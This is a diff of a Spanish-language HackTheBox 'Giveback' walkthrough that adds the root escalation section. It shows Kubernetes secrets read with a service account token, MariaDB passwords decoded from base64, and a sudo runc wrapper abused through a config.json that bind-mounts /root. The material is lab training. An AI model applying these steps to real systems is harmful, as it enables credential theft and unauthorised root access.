@@ -23,7 +23,9 @@ tags:
   - 
   - OSCP Style
 ---
-![](/assets/images/htb-writeup-giveback/giveback.png)
+<p align="center">
+<img src="/assets/images/htb-writeup-giveback/giveback.png">
+</p>
 
 texto
 
@@ -61,8 +63,7 @@ Herramientas utilizadas:
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#runC">Creando una Montura del Directorio root para Escalar Privilegios (CVE-2019-5736 - CVE-2024-21626)</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -549,6 +550,8 @@ Para lo que tenemos acceso es al **WordPress** y **Nginx**.
 
 Lo que me llama la atención es el servicio **MariaDB**, **Legacy Intranet** y **Kubernetes**.
 
+Investiguemos la definición de los dos últimos:
+
 | **Legacy Intranet Service** |
 |:---------------------------:|
 | *Un servicio de intranet heredado ("legacy intranet service") se refiere a una intranet antigua, a menudo alojada en servidores físicos y con sistemas anticuados. Estas plataformas suelen ser pasivas y desconectadas, dificultando la integración con herramientas modernas y la experiencia del empleado. Las intranets heredadas se están reemplazando por soluciones más nuevas y modernas basadas en la nube que ofrecen más personalización, conectividad y funcionalidad.* |
@@ -748,11 +751,6 @@ export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
 
 <h2 id="kubernetes">Utilizando Service Account Token para Leer Secrets</h2>
 
-Al enumerar esta máquina, nos damos cuenta que es otro contenedor:
-```bash
-
-```
-
 Podemos revisar las variables de entorno y vemos que aquí también se están usando **Kubernetes**:
 ```bash
 /var/www/html/cgi-bin # env
@@ -865,42 +863,149 @@ babywyrm@giveback:~$ cat user.txt
 <br>
 
 
-<h2 id=""></h2>
+<h2 id="runc">Creando una Montura del Directorio root para Escalar Privilegios (CVE-2019-5736 - CVE-2024-21626)</h2>
 
+Veamos qué privilegios tiene nuestro usuario:
 ```bash
+babywyrm@giveback:~$ sudo -l
+Matching Defaults entries for babywyrm on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, timestamp_timeout=0, timestamp_timeout=20
 
+User babywyrm may run the following commands on localhost:
+    (ALL) NOPASSWD: !ALL
+    (ALL) /opt/debug
+```
+Podemos ejecutar el binario debug como **Root**.
+
+Pero, observa lo que pasa cuando intentamos ejecutarlo:
+```bash
+babywyrm@giveback:~$ sudo /opt/debug
+[sudo] password for babywyrm: 
+[*] Validating sudo privileges...
+[*] Sudo validation successful
+Please enter the administrative password:
+```
+Nos esta pidiendo una contraseña.
+
+Si probamos la de nuestro usuario y la de otros usuarios, no funcionara.
+
+Sin embargo, al momento de consultar los **Secrets**, vemos en la parte de arriba que se mencionan los servicios **MariaDB y WordPress**.
+
+Primero consultemos los **Secrets** del **servicio MariaDB**:
+```bash
+/var/www/html/cgi-bin # curl -sSk -H "Authorization: Bearer $TOKEN" https://10.43.0.1/api/v1/namespaces/default/secrets/beta-vino-wp-mariadb
+...
+  },
+  "data": {
+    "mariadb-password": "c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T",
+    "mariadb-root-password": "c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw=="
+  },
+  "type": "Opaque"
+}
+```
+Tenemos dos hashes que parecen estar codificados en **base64**.
+
+Decodifiquémoslos:
+```bash
+echo -n "c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T" | base64 -d
+sW5sp4spa3u7RLyetrekE4oS                                                                                                                                                                                              
+
+echo -n "c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw==" | base64 -d
+sW5sp4syetre32828383kE4oS
+```
+Tenemos dos contraseñas.
+
+Al momento de probarlas, la contraseña que funciona es la de **mariadb-password**:
+```bash
+babywyrm@giveback:~$ sudo /opt/debug
+[sudo] password for babywyrm: 
+[*] Validating sudo privileges...
+[*] Sudo validation successful
+Please enter the administrative password: 
+
+[*] Administrative password verified
+Error: No command specified. Use '/opt/debug --help' for usage information.
+```
+
+Obtengamos más información del binario con la flag `--help`:
+```bash
+babywyrm@giveback:~$ sudo /opt/debug --help
+[*] Validating sudo privileges...
+[*] Sudo validation successful
+Please enter the administrative password: 
+
+[*] Administrative password verified
+[*] Processing command: --help
+Restricted runc Debug Wrapper
+
+Usage:
+  /opt/debug [flags] spec
+  /opt/debug [flags] run <id>
+
+Flags:
+  --log <file>
+  --root <path>
+  --debug
+```
+Indica que es el binario **runc Debug Wrapper**.
+
+Si investigamos este binario, resulta que tiene una vulnerabilidad que nos permite crear monturas de la máquina completa, siendo el **CVE-2019-5736** y **CVE-2024-21626**.
+
+Aquí te comparto unos blogs que te ayudaran a entender la vulnerabilidad:
+* <a href="https://ancat.github.io/exploitation/2019/02/16/cve-2019-5736.html" target="_blank">Exploiting CVE-2019-5736 to Escalate Privileges</a>
+* <a href="https://nitroc.org/en/posts/cve-2024-21626-illustrated/#exploit-via-setting-working-directory-to-procselffdfd" target="_blank">Illustrate runC Escape Vulnerability CVE-2024-21626</a>
+* <a href="https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/runc-privilege-escalation" target="_blank">RunC Privilege Escalation</a>
+* <a href="https://medium.com/@avijitsarkar123/docker-and-oci-runtimes-a9c23a5646d6" target="_blank">Docker and OCI Runtimes</a>
+
+La idea es que podamos realizar la montura del directorio `/root` para poder ver cualquier archivo privilegiado.
+
+Para hacerlo, primero crearemos un directorio de pruebas y crearemos el archivo **config.json** que será quien tenga la vulnerabilidad que nos permita crear la montura:
+```bash
+babywyrm@giveback:~$ cd /tmp
+babywyrm@giveback:/tmp$ mkdir test
+babywyrm@giveback:/tmp$ cd test/
+babywyrm@giveback:/tmp/test$ sudo /opt/debug spec
+[*] Validating sudo privileges...
+[*] Sudo validation successful
+Please enter the administrative password: 
+
+[*] Administrative password verified
+[*] Processing command: spec
+```
+Con el último comando, se crea el archivo **config.json**.
+
+Dentro de este archivo, agregaremos las siguientes instrucciones que permitiran la montura:
+```bash
+{"destination": "/bin","type": "bind", "source": "/bin", "options": ["ro","rbind","rprivate"]},
+{"destination": "/sbin", "type": "bind", "source": "/sbin", "options": ["ro","rbind","rprivate"]},
+{"destination": "/lib", "type": "bind", "source": "/lib", "options": ["ro","rbind","rprivate"]},
+{"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["ro","rbind","rprivate"]},
+{"destination": "/usr/lib", "type": "bind", "source": "/usr/lib", "options": ["ro","rbind","rprivate"]},
+{"destination": "/proc", "type": "proc", "source": "proc"},
+{"destination": "/dev", "type": "tmpfs", "source": "tmpfs"},
+{"destination": "/root", "type": "bind", "source": "/root", "options": ["bind","rw"]},
+{"destination": "/usr", "type": "bind", "source": "/usr", "options": ["bind","ro"]},
+{"destination": "/etc", "type": "bind", "source": "/etc", "options": ["bind","ro"]},
+{"destination": "/dev/pts", "type": "devpts", "source": "devpts", "options": ["newinstance","ptmxmode=0666"]}
 ```
 
 ```bash
-
+babywyrm@giveback:/tmp/test$ vim config.json 
+babywyrm@giveback:/tmp/test$ mkdir -p rootfs/bin rootfs/usr/bin rootfs/sbin rootfs/usr/sbin rootfs/lib rootfs/lib64 rootfs/usr/lib rootfs/root rootfs/host_root
 ```
 
+Ejecutamos nuestro archivo:
 ```bash
+babywyrm@giveback:/tmp/test$ sudo /opt/debug run demo
+[*] Validating sudo privileges...
+[*] Sudo validation successful
+Please enter the administrative password: 
 
-```
-
-```bash
-
-```
-
-<br>
-
-<h2 id=""></h2>
-
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
+[*] Administrative password verified
+[*] Processing command: run
+[*] Starting container: demo
+# cat /root/root.txt
+...
 ```
 
 
@@ -923,6 +1028,10 @@ babywyrm@giveback:~$ cat user.txt
 * https://hackviser.com/tactics/pentesting/services/kubernetes
 * https://delinea.com/blog/linux-privilege-escalation
 * https://medium.com/@evyeveline1/im-in-the-adm-group-can-i-escalate-yes-eventually-9475b968b97a
+* https://nitroc.org/en/posts/cve-2024-21626-illustrated/#exploit-via-setting-working-directory-to-procselffdfd
+* https://ancat.github.io/exploitation/2019/02/16/cve-2019-5736.html
+* https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/runc-privilege-escalation
+* https://medium.com/@avijitsarkar123/docker-and-oci-runtimes-a9c23a5646d6
 
 
 <br>
